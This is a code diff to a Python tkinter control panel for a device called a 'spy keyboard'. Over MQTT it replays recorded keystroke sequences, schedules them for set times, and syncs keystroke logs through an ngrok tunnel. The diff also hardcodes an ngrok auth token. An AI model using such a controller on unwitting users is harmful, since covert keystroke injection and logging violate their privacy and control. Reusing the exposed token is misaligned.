@@ -1,3 +1,4 @@
+from subprocess import Popen
 import tkinter as tk
 from tkinter import font
 import horusFunc as hf
@@ -5,14 +6,42 @@ from horusKeyboard import QWERTYKeyboard
 import pygame
 import paho.mqtt.client as mqtt
 import certifi
+from datetime import datetime
+import os
+import ngrok
 
 global Confirmar
 global mqtt_client
+global log_api
+global api_process
+
 mqtt_client = None
 
 teclas_in = "teclado_espiao/teclas_in"
 teclas_out = "teclado_espiao/teclas_out"
 routine_topic = "teclado_espiao/routine"
+command_request_topic = "teclado_espiao/command_request"
+command_response_topic = "teclado_espiao/command_response"
+
+# COMANDOS
+def send_cmd(cmd, params):
+    global mqtt_client
+    cmd_message = f"{cmd} [{','.join(params)}]"
+
+    mqtt_client.publish(command_request_topic, cmd_message)
+
+def cmd_schedule(routine_name, routine_cmd, date):
+
+    send_cmd("SCHEDULE", [routine_name, date, routine_cmd])
+
+def cmd_routine(routine_name, routine_cmd):
+
+    send_cmd("ROUTINE", [routine_name, routine_cmd])
+
+def cmd_sync_log():
+    global log_api
+
+    send_cmd("SYNC_LOG", log_api)
 
 keyboards = {}
 
@@ -163,7 +192,12 @@ def main_Screen():
     topic_handlers = {}
 
     frames = {}
-    routines = {}
+    routines = {
+        "teste": {
+            "desc": "isso é um teste",
+            "command": "('T', 'PRESSED', '0.40') ('E', 'PRESSED', '30.04') ('S', 'RELEASED', '19.73') ('T', 'RELEASED', '30.69') ('G', 'RELEASED', '51.84') ('S', 'PRESSED', '61.99') ('G', 'PRESSED', '29.85') ('E', 'RELEASED', '20.29') ('E', 'PRESSED', '69.66') ('S', 'RELEASED', '125.01') ('E', 'RELEASED', '52.24') ('G', 'RELEASED', '98.22')"
+        }
+    }
 
     selected_routine = None
 
@@ -204,6 +238,21 @@ def main_Screen():
         mqtt_client.loop_write()
         mqtt_client.loop_misc()
         root.after(20, step_mqtt)
+
+    # Log api start
+    def setup_api():
+        global log_api, api_process
+        api_command = ["python3","log_api.py"]
+        api_process = Popen(api_command)
+
+        ngrok.set_auth_token("2pKQ7D8bWrRMQKk5LFue3scb4o1_32UcALS4fAWgkyhz6UryW")
+
+        listener = ngrok.forward("localhost:8000")
+
+        print("LOG_API_URL", listener.url())
+        log_api = listener.url()
+    
+    setup_api()
 
     root = tk.Tk()    
     root.configure(bg='#252525')
@@ -376,7 +425,7 @@ def main_Screen():
     #schedule_routine_frame = tk.Frame(root, width=1030, height=720, bg="#252525")
     #schedule_routine_frame.place(x=250,y = 0)
 
-    schedule_routine_button = tk.Button(rotinas_botoes, text="Agendar", command=lambda: (hf.on_Click(), carrega_frame("ScheduleRoutine")), **button_Style_Sidebar)
+    schedule_routine_button = tk.Button(rotinas_botoes, text="Agendar", command=lambda: (hf.on_Click(), open_schedule_popup(selected_routine)), **button_Style_Sidebar)
     schedule_routine_button.place(x=0, y=90, width=300, height=70)
     schedule_routine_button.bind("<Enter>", hf.on_Enter_Sidebar)
     schedule_routine_button.bind("<Leave>", hf.on_Leave_Sidebar)
@@ -390,9 +439,8 @@ def main_Screen():
             return
 
         routine = routines[selected_routine]
-        routine_msg = f"({selected_routine}, NOW, {routine['command']})"
 
-        mqtt_client.publish(routine_topic, routine_msg)
+        cmd_routine(selected_routine, routine["command"])
 
     play_routine_button = tk.Button(rotinas_botoes, text="Play", command=lambda: (hf.on_Click(), play_routine()), **button_Style_Sidebar)
     play_routine_button.place(x=0, y=180, width=300, height=70)
@@ -426,7 +474,7 @@ def main_Screen():
 
     command_Text = tk.Text(create_routine_frame, font=("Anonymous Pro", 16), bg="#242323", fg="white", highlightthickness=0, bd=1, relief = "solid", state="disable")
     command_Text.place(x = 515, y = 250, width = 400, height = 300)
-    
+
     def adicionar_rotina(nome, desc, cmd):
         global routines
         
@@ -519,6 +567,99 @@ def main_Screen():
     record_routine_button.place(x=465,y=575, width= 200, height= 50)
     record_routine_button.bind("<Enter>", hf.on_Enter_Dominar)
     record_routine_button.bind("<Leave>", hf.on_Leave_Dominar)
+
+    build_routine_list()
+    
+    # Agendamento de rotinas
+
+    def open_schedule_popup(routine):
+
+        def set_placeholder(entry, placeholder_text):
+            """
+            Adds placeholder text functionality to a Tkinter Entry widget.
+            """
+            entry.insert(0, placeholder_text)
+            entry.configure(fg="grey")
+
+            def on_focus_in(event):
+                if entry.get() == placeholder_text:
+                    entry.delete(0, tk.END)
+                    entry.configure(fg="white")
+
+            def on_focus_out(event):
+                if not entry.get():
+                    entry.insert(0, placeholder_text)
+                    entry.configure(fg="grey")
+
+            entry.bind("<FocusIn>", on_focus_in)
+            entry.bind("<FocusOut>", on_focus_out)
+
+        schedule_routine_popup = tk.Toplevel()
+        schedule_routine_popup.title(f"Agendar {routine}")
+        schedule_routine_popup.configure(bg='#2e2b2b')
+        schedule_routine_popup.resizable(False, False)
+        schedule_routine_popup.geometry("500x200")
+        
+        # Label and Entry for the first text input
+        data_label = tk.Label(schedule_routine_popup, text="Data: ", font=("Anonymous Pro", 16, "bold"), bg = "#252525", fg = "white")
+        data_label.place(x=50, y=20)
+        data_entry = tk.Entry(schedule_routine_popup, width=10, font=("Anonymous Pro", 16), bg="#242323", fg="white", highlightthickness=0, bd=1, relief = "solid")
+        data_entry.place(x=50, y=50)
+        set_placeholder(data_entry, "DD/MM/YYYY")
+
+        # Label and Entry for the second text input
+        time_label = tk.Label(schedule_routine_popup, text="Hora: ", font=("Anonymous Pro", 16, "bold"), bg = "#252525", fg = "white")
+        time_label.place(x=300, y=20)
+        time_entry = tk.Entry(schedule_routine_popup, width=10, font=("Anonymous Pro", 16), bg="#242323", fg="white", highlightthickness=0, bd=1, relief = "solid")
+        time_entry.place(x=300, y=50)
+        set_placeholder(time_entry, "hh/mm")
+
+        def on_confirm():
+            try:
+                secure_date = datetime.strptime(data_entry.get(), "%d/%m/%Y").strftime("%d/%m/%Y")
+            except:
+                print("DATA INVÁLIDA")
+                return
+            
+            try:
+                secure_time = datetime.strptime(time_entry.get(), "%H:%M").strftime("%H:%M")
+            except:
+                print("HORÁRIO INVÁLIDO")
+                return
+
+            cmd_schedule(routine, routines[routine]["command"], f"{secure_date} {secure_time}")
+            
+            schedule_routine_popup.destroy()
+
+        
+        def on_cancel():
+            schedule_routine_popup.destroy()
+
+        confirm_config = {
+        "font": ("Anonymous Pro", 16, "bold"),
+        "bg": "#4CAF50",
+        "fg": "white",
+        "bd": 0,
+        "activebackground": "#45A049",
+        "activeforeground": "white"
+        }
+
+        cancel_config = {
+            "font": ("Anonymous Pro", 16, "bold"),
+            "bg": "#a1392d",
+            "fg": "white",
+            "bd": 0,
+            "activebackground": "#943a2f",
+            "activeforeground": "white"
+        }
+
+        # Cancel Button
+        cancel_button = tk.Button(schedule_routine_popup, text="Cancel", command=on_cancel, **cancel_config)
+        cancel_button.place(x=50, y=130)
+
+        # Confirm Button
+        confirm_button = tk.Button(schedule_routine_popup, text="Confirm", command=on_confirm, **confirm_config)
+        confirm_button.place(x=300, y=130)
 
     #Estilos dos Logs
     # FAZER A TELA DE LOG DENTRO DESTE FRAME (a parte de trocar de pagina e etc ja esta pronta)
@@ -628,5 +769,8 @@ def main_Screen():
             print(el)
 
     carrega_frame("Home")
-
-    root.mainloop()
+    try:
+        root.mainloop()
+    except KeyboardInterrupt:
+        api_process.terminate()
+        ngrok.disconnect()
